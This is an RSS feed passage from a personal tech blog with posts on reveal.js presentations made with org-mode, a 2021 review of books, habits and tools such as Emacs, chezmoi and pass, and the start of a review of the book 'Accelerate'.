
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Devs on blog.dornea.nu</title>
    <link>https://blog.dornea.nu</link>
    <description>Recent content in Devs on blog.dornea.nu</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>2021 Victor Dorneanu - All rights reserved</copyright>
    <lastBuildDate>Fri, 26 Feb 2021 11:12:21 +0100</lastBuildDate>
    
	<atom:link href="https://blog.dornea.nu/dev/feed.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Presentation as Code</title>
      <link>https://blog.dornea.nu/2022/01/19/presentation-as-code/</link>
      <pubDate>Wed, 19 Jan 2022 20:28:00 +0100</pubDate>
      
      <guid>https://blog.dornea.nu/2022/01/19/presentation-as-code/</guid>
      <content:encoded><![CDATA[<p>Last year I&rsquo;ve done some experiments with the <a href="https://ctan.org/pkg/beamer?lang=en">Beamer LaTex class</a> which you can use whenever
you want to export an ORG document to a <a href="https://orgmode.org/worg/exporters/beamer/tutorial.html">Beamer presentation</a>. I&rsquo;ve done some customizations
and I&rsquo;ve thought I have a quite decent presentation template. Till I&rsquo;ve found <a href="https://zenika.github.io/adoc-presentation-model/reveal/reveal-my-asciidoc.html">this</a>.</p>
<p>That <a href="https://revealjs.com/">reveal.js</a> presentation completely my mind and I&rsquo;ve started digging into <a href="https://asciidoctor.org/">asciidoc</a>. And then
there is also <a href="https://github.com/yashi/org-asciidoc">org-asciidoc</a> which will export your ORG buffer into <code>asciidoc</code>. However there were some
<a href="https://github.com/yashi/org-asciidoc/issues/14">issues</a> and quickly after Christmas I decided I&rsquo;ll go on my own and setup my own revealjs theme.</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Presentation as Code using <a href="https://twitter.com/hashtag/org?src=hash&amp;ref_src=twsrc%5Etfw">#org</a> mode in <a href="https://twitter.com/hashtag/emacs?src=hash&amp;ref_src=twsrc%5Etfw">#emacs</a> and <a href="https://twitter.com/hashtag/revealjs?src=hash&amp;ref_src=twsrc%5Etfw">#revealjs</a> - <a href="https://t.co/xszIHuDSEY">https://t.co/xszIHuDSEY</a> <a href="https://t.co/39W0R1DNRO">pic.twitter.com/39W0R1DNRO</a></p>&mdash; Victor Dorneanu (@victordorneanu) <a href="https://twitter.com/victordorneanu/status/1481908662251704320?ref_src=twsrc%5Etfw">January 14, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>Here are some links:</p>
<ul>
<li><a href="https://slides.dornea.nu">slides.dornea.nu</a>
<ul>
<li>here I&rsquo;d like to host my slides</li>
<li>yes, I plan to do more</li>
</ul>
</li>
<li><a href="https://github.com/dorneanu/slides">github.com/dorneanu/slides</a>
<ul>
<li>check out the <code>content</code> folder and inspect the revealjs setup file</li>
<li>for theming I use some of <a href="https://github.com/Zenika/adoc-presentation-model/tree/master/docs/themes">Zenika&rsquo;s themes</a> with small customizations</li>
</ul>
</li>
</ul>
<p>And here some GIF I&rsquo;ve put on Twitter:</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Short demo of my last &quot;Presentation as Code&quot; slides available at <a href="https://t.co/xszIHuDSEY">https://t.co/xszIHuDSEY</a> <a href="https://twitter.com/hashtag/revealjs?src=hash&amp;ref_src=twsrc%5Etfw">#revealjs</a> <a href="https://twitter.com/hashtag/emacs?src=hash&amp;ref_src=twsrc%5Etfw">#emacs</a> <a href="https://twitter.com/hashtag/orgmode?src=hash&amp;ref_src=twsrc%5Etfw">#orgmode</a> <a href="https://t.co/GbKFxpK5l5">pic.twitter.com/GbKFxpK5l5</a></p>&mdash; Victor Dorneanu (@victordorneanu) <a href="https://twitter.com/victordorneanu/status/1482694904547586051?ref_src=twsrc%5Etfw">January 16, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

]]></content:encoded>
    </item>
    
    <item>
      <title>My 2021 review</title>
      <link>https://blog.dornea.nu/2021/12/13/my-2021-review/</link>
      <pubDate>Mon, 13 Dec 2021 00:00:00 +0100</pubDate>
      
      <guid>https://blog.dornea.nu/2021/12/13/my-2021-review/</guid>
      <content:encoded><![CDATA[<p>After last year&rsquo;s pandemic shock, this year has brought more hope and motivation to
people. I&rsquo;ve felt motivated to learn new things, deep-dive into unknown areas and finally
change some things in my life. In this post I&rsquo;ll share with you my most valued (software)
tools, productivity tips, some books worth reading and finally some failure and success
with regards to my habits.</p>
<h2 id="health">Health</h2>
<h3 id="wim-hof-method">Wim Hof Method</h3>
<p>Last year just before the (pandemic) winter blues was about to begin I&rsquo;ve had enough of
that feeling something you cannot control was already part of my daily life. Seeking for
more <strong>self-control</strong> and that &ldquo;I&rsquo;m still alive&rdquo; feeling, I&rsquo;ve decided to go for <a href="https://www.wimhofmethod.com/">The Wim Hof
Method</a>.</p>
<p>I was determined to cold shower every day and do breath work as well. Breathing exercises
were not new to me since I was practising <a href="https://brainfck.org/#Pranayama">Pranayama</a> for a while.</p>
<p>After some weeks of practice cold was not an enemy anymore. My body (and also my mind)
adapted to that kind of stress and soon I was able to go out without any jacket, just
wearing a t-shirt - and my trouses of course :) Eventually I was able to keep my habbits
and around February I was &ldquo;bathing&rdquo; in snow in my swim shorts. Besides that, during my
breath work sessions I managed to hold my breath for more 3 minutes - several times. All
this success motivated me to keep going and make my new habbits part of my <a href="https://brainfck.org/#Atomic%20Habits/4%20Laws%20of%20Behaviour%20Change">life style</a>.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/0BNejY1e9ik" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h2 id="books">Books</h2>
<p>As you know you can always browse <a href="https://brainfck.org/#Books">my digital bookshelf</a> in my <a href="https://brainfck.org/">personal Zettelkasten</a>. This
year I&rsquo;ve read more IT related books than last year. I&rsquo;ve especially focussed on
<a href="https://brainfck.org/#Software%20Architecture">Software Architecture</a>, <a href="https://brainfck.org/#Golang">Golang</a> and
<a href="https://brainfck.org/#DevSecOps">DevSecOps</a>.</p>
<h3 id="clean-architecture">Clean Architecture</h3>
<p>If you write code and don&rsquo;t know <a href="http://cleancoder.com/products">Uncle Bob</a> then you&rsquo;ll have to read this book. Since my
background is not of software engineering I had to learn a lot about good coding
principles and how to structure my code properly. Very early in this process I came across
Uncle Bob&rsquo;s famous <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Clean Architecture</a> diagram which describes how to structure your
software project into different <em>layers</em>.</p>
<p>Well then I was blindly using those principles in my software projects without knowing
that <em>Clean Architecture</em> is more than a diagram and some depedencies between some layers.
I&rsquo;m glad I&rsquo;ve finally managed to read this book (along with <a href="https://brainfck.org/#The%20Clean%20Code">The Clean Code</a> and <a href="https://brainfck.org/#The%20Clean%20Coder">The Clean Coder</a> which were not that good as this
one) and learn more about <a href="https://brainfck.org/#Software%20Engineering">engineering principles</a> and
<a href="https://brainfck.org/#Software%20Architecture">software architecture</a> in general. Additionally I think
<a href="https://brainfck.org/#SOLID">SOLID principles</a> should be part of every (software) engineer&rsquo;s skills
repertoire.</p>
<blockquote>
<p>You think good architecture is expensive, try bad architecture. &ndash; <a href="https://brainfck.org/#The%20Clean%20Architecture%20-%20Note%202">The Clean Architecture - Note 2</a></p>
</blockquote>
<p>I was also surprised that <a href="https://brainfck.org/#Hexagonal%20Architecture">Hexagonal Architecture</a> (also
known as <strong>ports</strong> and <strong>adapters</strong> architecture) almost has the same principles.</p>



<blockquote class="notice info">
  I also recommend <a href="https://herbertograca.com/2017/11/16/explicit-architecture-01-ddd-hexagonal-onion-clean-cqrs-how-i-put-it-all-together/">DDD, Hexagonal, Onion, Clean, CQRS &hellip; How I put it all together</a> reading.
An excellent article!
</blockquote>

<h3 id="black-hat-go">Black Hat Go</h3>
<p>Back at <a href="/2021/09/15/bye-bye-scout24/">Scout24</a> we were mainly using Python for our internal services and tools. But I
wanted to make my colleagues more aware of Golang&rsquo;s capabilities and introduce this
language to the team. Instead of some standardized approach (core types, basic control
flows, &ldquo;classes&rdquo;, interfaces etc.) I wanted to actually <strong>do</strong> something with the language
that might catch people&rsquo;s interest.</p>
<p><a href="https://www.goodreads.com/book/show/35642241-black-hat-go">Black Hat Go</a> was the right book to start with. It gives you just enough details to get you
started with the language and then you start implementing network scanners, <a href="https://gist.github.com/dorneanu/02c9c5bb83e881e7ad2c1e93c7c2fd24">keyboard
loggers</a>, DNS tunneling tools (like <a href="https://github.com/sysdream/chashell">chashell</a>) and much more. I used some of the examples in
the book to introduce my team to <em>offensive</em> hacking while showing Golang&rsquo;s key features (go
routines, interfaces, composition instead of inheritance etc.) Also if you&rsquo;re a pentester
and need to cross-compile your tools for different architectures, this book is definitely
for you.</p>
<h3 id="accelerate">Accelerate</h3>
<p>About the science of Lean software and DevOps. I wrote an extensive <a href="/2021/11/24/book-review-accelerate-the-science-of-lean-software-and-devops/">summary in my last blog post</a>.</p>
<h3 id="agile-application-security">Agile Application Security</h3>
<p>I consider this book to be the best one I&rsquo;ve read on <a href="https://brainfck.org/#AppSec">Application Security</a>
in the last years. And I&rsquo;ll tell you why: When was the last time that a cool <strong>defensive</strong>
mechanism/measure/technology (beside the cyber-security branded vendor X products) had a
cool name like Logjam, Shellshock or Heartbleed? I know vulnerability research, exploit
development and some cool hacks are fun. But this is not what&rsquo;s needed to build a Security
minded culture inside some organization. This is also not what developers (and everybody
else included in the software engineering process) need to know. In an Agile world
different roles have to work together: Developers need to understand and adopt Security
best practices and also take responsability for the security of their systems. You build
it, you run it and you also keep it safe and secure!</p>
<p>Product owners/managers need to understand security/compliance requirements and give agile
teams enough time for the implementation of the security measures. And last but not least:
Security professionals will also have to adapt to the Agile world. They need to learn to
accept changes more often, to work faster and manage Security risks in incremental terms.
And most important: Security needs to become an <strong>enabler</strong> and not a blocker!</p>
<h3 id="go-with-the-domain">Go with the Domain</h3>
<p>If you know about <a href="https://threedots.tech">Three Dots Labs</a> already and also have read their blog series on
<a href="https://threedots.tech/tags/ddd/">Domain-driven Design with Go</a> then you don&rsquo;t necessarily need to read <a href="https://threedots.tech/go-with-the-domain">this book</a>. I think
the content is quite good and has to be &ldquo;diggested&rdquo; over a longer period of time. However,
if you&rsquo;re not familiar with <a href="https://brainfck.org/#DDD">Domain-Driven Design</a> principles this book might
be to much for you. Also be prepared to invest a lot of time in their <a href="https://github.com/ThreeDotsLabs/wild-workouts-go-ddd-example">Go DDD example
application</a> and carefully read the code. After reading their blog posts first I was
expecting to mind more context/background information in their book. This was not the case
and I also don&rsquo;t blame them for this. Writing a book (and also blog posts) is very time
intensive especially when you don&rsquo;t have that much time available.</p>
<h3 id="1984">1984</h3>
<p>I remember when I first started reading the first 20 pages and I was shocked how much of
our today&rsquo;s world was part of the environment described. Also this book got recommended to
me several ways but it was until the pandemic that I had enough motivation to push myself
through. I&rsquo;m not a Sci-Fi fan and usually you won&rsquo;t find this kind of book genre in my
<a href="https://brainfck.org/#Books">bookshelf</a>. But I&rsquo;ll add this one to the &ldquo;must reads&rdquo;. Eventually I&rsquo;ll read
it again in some couple of years just to find out what happened since last time I did so.
I guess there is a reason this book belongs to the <a href="https://en.wikipedia.org/wiki/List%5Fof%5Fbest-selling%5Fbooks">best selling ones</a> and I definitelly
recommend it to everyone interested in <em>politics</em>, <em>history</em> and of course <em>Sci-Fi</em>.</p>
<h3 id="das-experiment-sind-wir">Das Experiment sind wir</h3>
<p>In English: &ldquo;We are the experiment&rdquo;. Despite its rather controversial title, I read this
book at the beginning of the year after listening to this podcast: <a href="https://www.kuechenstud.io/medienradio/podcast/di091-fluch-und-segen-exponentiellen-wachstums-christian-stoecker-autor/">Das Interview: Fluch
und Segen exponentiellen Wachstums</a> (in English: Curse and blessing of exponential growth).
This book got me into the basics of <a href="https://brainfck.org/#CRISPR/Cas9">CRISPR/Cas9</a> and
<a href="https://brainfck.org/#mRNA">mRNA</a>. It also made me think about schooling and education systems which (at
least in Germany) don&rsquo;t really teach students about complex systems/mechanisms that
surround us. And to be more specific: AI/ML basics are not taught at school, benefits of
CRISPR gene editing are often ignored by mass-media. Instead people have this feeling
they&rsquo;re part of something that <em>happens</em> to them instead of <em>being</em> part of that something.
You could apply this to <a href="https://brainfck.org/#Corona">Corona</a> and many other global challenges (climate
change?) that will follow in the next years.</p>
<h3 id="factfulnes">Factfulnes</h3>
<p>I remember someone said to me I should read this book because <a href="https://www.gatesnotes.com/books/factfulness">Bill Gates recommended it</a>.
And it turned out this book changed the way how I see the world. But most important: It
showed me that my knowledge about the world is kind of out-dated. Just to give you an
example: Before reading the book I thought the world was divided into 3 parts/classes. We
tend to classify countries around the globe in <em>developed</em> economies, economies <em>in
transition</em> and <em>developing</em> economies. But if you look at the data - at this book is
definitelly <em>data-driven</em> - you&rsquo;ll notice that you can divide the world on a <em>4</em> category
model based on <em>income per person</em> (check <a href="https://en.wikipedia.org/wiki/Factfulness:%5FTen%5FReasons%5FWe%27re%5FWrong%5FAbout%5Fthe%5FWorld%5F%E2%80%93%5Fand%5FWhy%5FThings%5FAre%5FBetter%5FThan%5FYou%5FThink">Four income levels</a> at Wikipedia). And this is just
<em>one</em> example. If you want to self-test your views/knowledge make sure you do this at
<a href="https://www.gapminder.org/">gapminder.org</a> (they also have really awesome <a href="https://www.gapminder.org/tools/">visualizations</a>).</p>
<h3 id="the-plant-paradox">The Plant Paradox</h3>
<p>Initially I wasn&rsquo;t sure if I should write a summary on this one. And that&rsquo;s because this
one is the type of books you know it contains somehow false affirmations but the are some
that make you ponder. Since 2 years I constantly try to adjust my <em>Nutrition</em> based on
information I get from different books. After reading <a href="https://brainfck.org/#How%20not%20to%20die">How not to die</a> last year I think I managed to get most of my nutritional biases under control. I
also managed to get a deeper understanding of the bio-mechanics that make our bodies so
interesting. Well <em>The Plant Paradox</em> tries to turn scientific based nutritional knowledge
upside down. At the core of the &ldquo;paradox&rdquo; are <a href="https://en.wikipedia.org/wiki/Lectin">lectins</a> that are mostly found in all foods,
especially legumes, fruits and grains. The author claims that these tiny proteins cause
<em>gut permeability</em> and therefore <em>inflamations</em> that drive auto-immune diseases. While Dr.
Gundry&rsquo;s thesis <a href="https://www.youtube.com/watch?v=7NT4q%5F5dfLs&amp;ab%5Fchannel=NutritionFacts.org">seems to be wrong</a> (and yes, I&rsquo;m fan of Dr. Greger) and most of the lectins
can be removed by (pressurized) cooking, I still think there are some small grains of
truth in there. I also recommend reading <a href="https://hcfricke.com/2017/09/24/buchkritik-plant-paradox-von-stephen-r-gundry-md/">this summary</a> (in German) which provides more
cross-doamin knowledge related to different aspects of the thesis.</p>
<h2 id="habits">Habits</h2>
<p>Almost one year ago - and definitely after reading <a href="https://brainfck.org/#Atomic%20Habits">Atomic Habits</a> -
I was looking for a digital habit tracking tool. My motivation was not to develop new
habits but stick to existing ones and have a visual dashboard how well I&rsquo;m doing. After
giving up my <a href="https://brainfck.org/#Bullet%20Journal">Bullet Journal</a> tracking page, I&rsquo;ve finally found
<a href="https://play.google.com/store/apps/details?id=org.isoron.uhabits&amp;hl=en&amp;gl=US">Loop Habit Tracker</a> which accompanies me every day.</p>

    


<a href="/posts/img/2021/my-review/habits-app.png" class="glightbox" data-glightbox="title:Loop Habit Tracker Application; description: Main view; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-app.png" alt="image">
</a>

<p>I use <em>widgets</em> on my (Android) where I can easily toggle multiple habits as done with
simple clicks. The advantage of using widgets is the fact you don&rsquo;t have to first run the
application <em>and then</em> toggle the habits. Usually after my morning routines, I just go
through my habits and click accordingly.</p>

    


<a href="/posts/img/2021/my-review/habits-widgets.png" class="glightbox" data-glightbox="title:Loop Habit Tracker Application; description: Widgets; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-widgets.png" alt="image">
</a>

<p>In the following sections you&rsquo;ll see different <em>heat maps</em> related to some <em>habit</em>. They show
you on which days a specific habit activity took place or not.</p>
<h3 id="meditation">Meditation</h3>

    


<a href="/posts/img/2021/my-review/habits-meditation.png" class="glightbox" data-glightbox="title:Meditation; description: Heat map 2021; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-meditation.png" alt="image">
</a>

<p>I use <a href="https://www.7mind.de/">7mind</a> for my morning meditation. Usually I don&rsquo;t track my meditation <em>time</em> but from
times to times I do longer session (up to 20 minutes). As you can see I usually don&rsquo;t
meditate at the weekend since I rather spend time with my family and prefer not to wake up
that early.</p>
<h3 id="cold-shower">Cold shower</h3>

    


<a href="/posts/img/2021/my-review/habits-cold-shower.png" class="glightbox" data-glightbox="title:Cold shower; description: Heat map 2021; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-cold-shower.png" alt="image">
</a>

<p>After reading more about <a href="https://www.wimhofmethod.com/">The Wim Hof Method</a> I was determined enough to take cold showers
on a regular basis. I&rsquo;m pretty happy I managed to stick to this habit throughout the year.</p>
<h3 id="breath-work">Breath work</h3>

    


<a href="/posts/img/2021/my-review/habits-pranayama.png" class="glightbox" data-glightbox="title:Breath work; description: Heat map 2021; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-pranayama.png" alt="image">
</a>

<p>This is the type of morning exercise that boosts up my energy level after waking up. I
usually do <em>alternative nostril breathing</em> (Yoga), break work after Wim Hof (I would say
80-90% of the time I do 3 rounds of 50 inhale/exhale rounds) and most recently also <a href="https://www.somabreath.com/">SOMA breath</a>.</p>
<h3 id="reading">Reading</h3>

    


<a href="/posts/img/2021/my-review/habits-reading.png" class="glightbox" data-glightbox="title:Reading; description: Heat map 2021; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-reading.png" alt="image">
</a>

<p>I&rsquo;m not happy with this one since I know I could have read more. It&rsquo;s just that I use to
have multiple <em>projects</em> running in parallel so I need to apply some time-slicing to my
available time. What also keeps me busy from reading <em>more</em> is the fact that always do some
<em>post-reading</em> after each book: I collect notes/thoughts, I re-read interesting
pages/concepts, put everything into my <a href="https://brainfck.org">Zettelkasten</a>. I&rsquo;m already looking for a better
reading workflow. Maybe you have some ideas.</p>
<h3 id="sports-workout">Sports/Workout</h3>

    


<a href="/posts/img/2021/my-review/habits-sport.png" class="glightbox" data-glightbox="title:Sports/Workout; description: Heat map 2021; descPosition: left">
    <img src="/posts/img/2021/my-review/habits-sport.png" alt="image">
</a>

<p>Yes, this is the most embarrassing one. I was somehow motivate to do more <em>sports</em> beginning
with April but after June that kind of faded out. Next year I definitely want to do more
workout, at least once a week. I also want to combine my bodyweight training
(calisthenics) with climbing.</p>
<h2 id="tools">Tools</h2>
<h3 id="emacs">Emacs</h3>
<p>I started going down the &ldquo;Emacs rabbit hole&rdquo; almost 2 years ago. And I still don&rsquo;t regret
doing so, although I&rsquo;ve spent hours of debugging, trial and error, random copy&amp;paste of
Elisp code. Also switching from <a href="https://www.spacemacs.org/">Spacemacs</a> to <a href="https://github.com/hlissner/doom-emacs">Doom Emacs</a> had a huge boost regarding my
productivity in Emacs. Now I can say I do understand most of my configuration (see my
<a href="https://github.com/dorneanu/dotfiles">dotfiles</a>) whereas one year ago I was randomly copy&amp;paste and putting pieces together in
the hope they&rsquo;ll somehow work.</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">After 15 years of <a href="https://twitter.com/hashtag/vim?src=hash&amp;ref_src=twsrc%5Etfw">#vim</a> usage I&#39;ve switched to <a href="https://twitter.com/hashtag/spacemacs?src=hash&amp;ref_src=twsrc%5Etfw">#spacemacs</a> and org-mode. This was a decision I definitely don&#39;t regret.</p>&mdash; Victor Dorneanu (@victordorneanu) <a href="https://twitter.com/victordorneanu/status/1222158980627288064?ref_src=twsrc%5Etfw">January 28, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<h4 id="modules">Modules</h4>
<p>My top modules for this year:</p>
<ul>
<li><a href="https://github.com/alphapapa/pocket-reader.el">pocket-reader.el</a>
<ul>
<li>I use it every day as my favourite <a href="https://getpocket.com">getpocket</a> client and as a collection inbox for everything I want to read, to share or to <a href="https://brainfck.org">bookmark</a>.</li>
</ul>
</li>
<li><a href="https://github.com/skeeto/elfeed">elfeed</a>
<ul>
<li>my RSS/Atom feeds aggregator which helps me to stay focused and read everything at one place
<ul>
<li>I like RSS (and you can still use RSS for everything)</li>
<li>Email/Newsletter subscription kind of destroyed the Internet :)</li>
</ul>
</li>
<li>if I like the excerpt and can sent the URL to getpocket</li>
</ul>
</li>
<li><a href="https://magit.vc/">magit</a>
<ul>
<li>still a <strong>magic</strong> tool to deal with git</li>
<li>I also couldn&rsquo;t imagine conflict resolution can be that easy in a terminal</li>
</ul>
</li>
<li><a href="https://www.djcbsoftware.nl/code/mu/mu4e.html">mu4e</a>
<ul>
<li>yeah, finally I can read my mails in the terminal
<ul>
<li>have a look at my <a href="https://github.com/dorneanu/dotfiles/blob/main/dot%5Fmbsyncrc.tmpl">configuration</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="https://github.com/john2x/dank-mode">dank mode</a>
<ul>
<li>this relatively unknown/new <strong>reddit</strong> client is like a hidden gem</li>
<li>you can read comments/posts as threads</li>
<li>I also like the Emacs like key bindings</li>
</ul>
</li>
<li><a href="https://github.com/marcinkoziej/org-pomodoro">org-pomodoro</a>
<ul>
<li>I use it daily</li>
<li>See below for more background</li>
</ul>
</li>
</ul>
<h3 id="configuration-management">Configuration management</h3>
<p>I use to keep my configuration files in a <a href="https://github.com/dorneanu/dotfiles">dotfiles</a> repository, publicly available. This
year I had to keep custom configurations for 4-5 machines in different contextes (work,
private). So I needed to find a way how to manage configuration files and apply
customizations depending on the machine where that specific config was needed.</p>
<p>Initially I came across <a href="https://github.com/anishathalye/dotbot">dotbot</a> which is written in Python and uses a YAML/JSON
configuration file in order to setup your dotfiles. But then I&rsquo;ve found <a href="https://www.chezmoi.io/">chezmoi.</a></p>
<h4 id="chezmoi"><a href="https://www.chezmoi.io/">chezmoi</a></h4>
<p>This little <a href="https://brainfck.org/#Golang">Golang</a> utility will manage your dotfiles across multiple machines in a secure manner. Among the top features:</p>
<ul>
<li>You will have a single source of truth
<ul>
<li>in one git repository you&rsquo;ll define your basic configuration</li>
<li>for each machine you can write <a href="https://pkg.go.dev/text/template">templates</a> where you can change the behaviour depending on the operating system, architecture etc.</li>
</ul>
</li>
<li>secret management is outsourced
<ul>
<li>chezmoi can retrieve secrets from &ldquo;1Password, Bitwarden, gopass, KeePassXC, LastPass, pass, Vault, Keychain, Keyring, or any command-line utility of your choice&rdquo;</li>
</ul>
</li>
<li>it&rsquo;s fast</li>
<li>declarative
<ul>
<li>you define the desired state of files, directories, symlinks in the git repository (source of truth) and chezmoi will update your <code>$HOME</code> directory to match that state</li>
</ul>
</li>
</ul>
<h4 id="pass"><a href="https://www.passwordstore.org/">pass</a></h4>
<p>Password management is not easy, especially when you want to stay away from commercial
solutions. I wish I knew <code>pass</code> before I bought LastPass premium. Here are the reasons why I
like this little tool:</p>
<ul>
<li>it follows the <em>Unix</em> philosophy
<ul>
<li>your passwords are stored in a simple file/folder structure</li>
<li>per file you&rsquo;ll have one secret</li>
</ul>
</li>
<li>each file gets <em>encrypted</em> using <code>gpg</code>
<ul>
<li>I like this approach since I can also use my <a href="https://www.yubico.com/">Yubikey(s)</a> to do the encryption/decryption (BTW: This <a href="https://github.com/drduh/YubiKey-Guide">Yubikey guide</a> is excellent if you want to setup your device for GPG and SSH authentication)</li>
</ul>
</li>
<li>you have version control
<ul>
<li>you can track password changes using <code>git</code></li>
<li>you can share your passwords between multiple machines</li>
</ul>
</li>
<li>you have <a href="https://www.passwordstore.org/#extensions">extensions</a></li>
<li>although <code>pass</code> is a CLI there are also <a href="https://www.passwordstore.org/#other">GUIs</a> for other platforms
<ul>
<li>for Android there is <a href="https://github.com/android-password-store/Android-Password-Store">Android Password Store</a></li>
<li><a href="https://github.com/browserpass/browserpass-extension">BrowserPass</a> for Chromium or Firefox</li>
</ul>
</li>
<li>you might also give <a href="https://github.com/gopasspw/gopass">gopass</a>, the &ldquo;<em>slightly</em> more awesome standard unix password manager for teams&rdquo; a try</li>
</ul>
<h3 id="productivity">Productivity</h3>
<h4 id="pomodorro">Pomodorro</h4>
<p>If you have troubles keeping yourself <em>focussed</em> and tend to do <em>multi-tasking</em>, then I
recommend you should use a <em>pomodorro</em> timer. At least since my son got born, I don&rsquo;t have
that much time available as I used to have some years ago. Becoming a parent indeed
changed the way I define <a href="https://www.scotthyoung.com/blog/2021/07/05/dad-productivity/">productivity</a>. I can not concentrate on one task during a large
period of time because I always get &ldquo;distracted&rdquo;. I need to do some grocery shopping, I
need to pick up my son from the kindergarten, I need to to some household&hellip; you name it.
So I had to find a way how to work on several projects/tasks (in a private but also work
context) but in <em>small</em> chunks of work.</p>
<p>After using this technique for years now, I&rsquo;m pretty sure it is one of my personal most
efficient productivity tools. Just use a (clock) timer, an application on your smartphone
or <a href="https://pomofocus.io/">pomofocus.io</a> to get you started. Do rounds of 25-30 minutes (one pomodorro) and do a
larger break after 4 rounds. Believe me, you&rsquo;ll notice the difference.</p>
<h4 id="wakatime"><a href="https://wakatime.com">Wakatime</a></h4>
<p>By now you should know I&rsquo;m obsessed with <em>time tracking</em> and being productive in multiple
contextes. But sometimes I forget to start my pomodorro timer and at the end of the day I
don&rsquo;t know how much time I&rsquo;ve spent working on a specific task. You can all this with
Emacs and <a href="https://github.com/marcinkoziej/org-pomodoro">org-pomodoro</a> but for those of you non-Emacsers there is <a href="https://wakatime.com/">wakatime.com</a>. They have
<a href="https://wakatime.com/plugins">plugins</a> for almost everything: Shells, IDEs, Excel, Powerpoint etc.</p>
<p>If you have data privacy concerns, you might want to <em>hidden</em> project and file names (also
check out my <a href="https://github.com/dorneanu/dots/blob/main/dot%5Fwakatime.cfg.tmpl">wakatime configuration file</a>).</p>
<h4 id="loop-habit-tracker"><a href="https://play.google.com/store/apps/details?id=org.isoron.uhabits&amp;hl=en&amp;gl=US">Loop Habit Tracker</a></h4>
<p>Sticking to healthy habits is important. <a href="https://brainfck.org/#Atomic%20Habits/Habit%20Tracking">Tracking</a>
your progress will remind you to <em>act</em>. You have your progress in front of you and that will
eventually <em>motivate</em> you. You don&rsquo;t feel motivated enough? Then you might apply the <a href="https://jamesclear.com/paper-clips">paper
clips strategy</a>. Whatever you do: Track your progress and be honest to yourself. Don&rsquo;t push
yourself to hard, just treat yourself well and stick to your habit.</p>
<h2 id="outlook">Outlook</h2>
<p>For the upcoming year I&rsquo;d like to</p>
<ul>
<li>learn
<ul>
<li><a href="https://www.typescriptlang.org/">TypeScript</a>
<ul>
<li>I&rsquo;ve already started a course on <a href="https://www.udemy.com/course/understanding-typescript/">Udemy</a> and I hope to finish it soon. The initial motivation was <a href="https://docs.aws.amazon.com/cdk/latest/guide/work-with-cdk-typescript.html">AWS CDK</a> but meanwhile I think it&rsquo;s a great <em>static typed</em> language.</li>
<li>I&rsquo;m still not a JavaScript fan but I hope TypeScript will allow me to teach myself some <em>frontend</em> basics.</li>
</ul>
</li>
<li><a href="https://vuejs.org/">Vue.JS</a>
<ul>
<li>I want to be able to build <em>modern</em> frontend applications and use new technologies beyond HTML, CSS and JavaScript :)</li>
<li>I heard it&rsquo;s quite beginner friendly</li>
<li><a href="https://v3.vuejs.org/guide/typescript-support.html">v3</a> supports TypeScript</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Web3">Web3</a>
<ul>
<li>I want to learn how blockchains work and especially focus on <a href="https://ethereum.org/en/">Ethereum</a></li>
<li>Not only for my current job I&rsquo;d like to know which <em>Security</em> threats exist beyond wallet theft</li>
</ul>
</li>
</ul>
</li>
<li>read
<ul>
<li><a href="https://www.goodreads.com/book/show/22512931-building-microservices">Building Microservices: Designing Fine-Grained Systems</a></li>
<li><a href="https://leanpub.com/visualising-software-architecture">Visualise, document and explore your software architecture</a></li>
<li><a href="https://abseil.io/resources/swe-book">Software Engineering at Google</a></li>
<li><a href="https://dataintensive.net/">Designing Data-Intensive Applications</a></li>
<li><a href="https://www.goodreads.com/book/show/28602719-domain-driven-design-distilled">Domain-Driven Design Distilled</a></li>
<li><a href="https://github.com/ethereumbook/ethereumbook">Mastering Ethereum</a></li>
</ul>
</li>
<li>finish <a href="https://github.com/dorneanu/access-key-rotator">access-key-rotator</a> and release first version</li>
<li>clean up my <a href="https://brainfck.org">Zettelkasten</a></li>
<li>start working on my <strong>book</strong>
<ul>
<li>about Golang and Security :)</li>
</ul>
</li>
</ul>
<p>That&rsquo;s it for now. Please share your favourite tools/productivity tipps as well as random comments/thoughts.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Book review: Accelerate - The science of Lean software and DevOps</title>
      <link>https://blog.dornea.nu/2021/11/24/book-review-accelerate-the-science-of-lean-software-and-devops/</link>
      <pubDate>Wed, 24 Nov 2021 20:24:00 +0100</pubDate>
      
      <guid>https://blog.dornea.nu/2021/11/24/book-review-accelerate-the-science-of-lean-software-and-devops/</guid>
      <content:encoded><![CDATA[<p>I always use to say: &ldquo;<em>Software currently rules the world.</em>&rdquo; Almost every aspect in our
(digital) life has to do with software: The apps you use on your smartphone, the
mail/hosting services you rely on, online shopping, train tickets, in general everything
that somehow adds value to your life. Competition among organizations is driven by speed,
the ability to deliver new features to the customers, stable products, security within
their eco-systems and many other aspects. And what do they have in common? If you ask me:
<strong>Software</strong>.</p>
<h2 id="key-takeaways">Key takeaways</h2>
<ul>
<li>Software delivery performance is vital for business since it impacts the speed and velocity you deliver value to your customers</li>
<li>There are 24 practices that can have an influence on your software delivery and these are categorized into 5 categories</li>
<li>It takes technical but also organizational changes to create high-performing teams</li>
